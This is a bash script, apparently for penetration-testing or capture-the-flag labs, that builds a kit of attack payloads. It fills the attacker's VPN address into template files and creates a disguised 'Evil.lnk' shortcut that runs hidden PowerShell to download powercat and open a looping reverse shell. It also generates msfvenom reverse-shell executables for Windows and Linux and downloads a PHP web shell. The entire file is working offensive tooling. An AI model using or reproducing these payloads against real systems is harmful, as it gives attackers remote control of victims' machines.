#!/bin/bash
OUTPUT=$HOME/nastygrams
IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
PORT=4444

mkdir -p "$OUTPUT"
rm "${OUTPUT:?}"/* -rf

for f in src/nastygrams/*
do
  sed "$f" -e "s/\^IP\^/$IP/g" -e "s/\^PORT\^/$PORT/g" > "$OUTPUT"/"$(basename "$f")"
done

wine /usr/share/windows/nirsoft/NirSoft/nircmd.exe shortcut "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe" "C:\\" "TEMP" "-WindowStyle hidden -c IEX(New-Object System.Net.WebClient).DownloadString('http://$IP/win/shell/powercat.ps1');while(\$true){powercat -c $IP -p 4444 -e powershell}" "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
cp ~/.wine/drive_c/TEMP.lnk /srv/webdav/Evil.lnk

msfvenom --platform windows --arch x86 --payload windows/shell_reverse_tcp     "LHOST=$IP" "LPORT=$PORT" -f exe > "$OUTPUT/revshell_win32.exe"
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp "LHOST=$IP" "LPORT=$PORT" -f exe > "$OUTPUT/revshell_win64.exe"
msfvenom --platform linux   --arch x86 --payload linux/x86/shell_reverse_tcp   "LHOST=$IP" "LPORT=$PORT" -f elf > "$OUTPUT/revshell_lin32"
msfvenom --platform linux   --arch x64 --payload linux/x64/shell_reverse_tcp   "LHOST=$IP" "LPORT=$PORT" -f elf > "$OUTPUT/revshell_lin64"
curl -L https://github.com/flozz/p0wny-shell/raw/master/shell.php > "$OUTPUT/shell.php"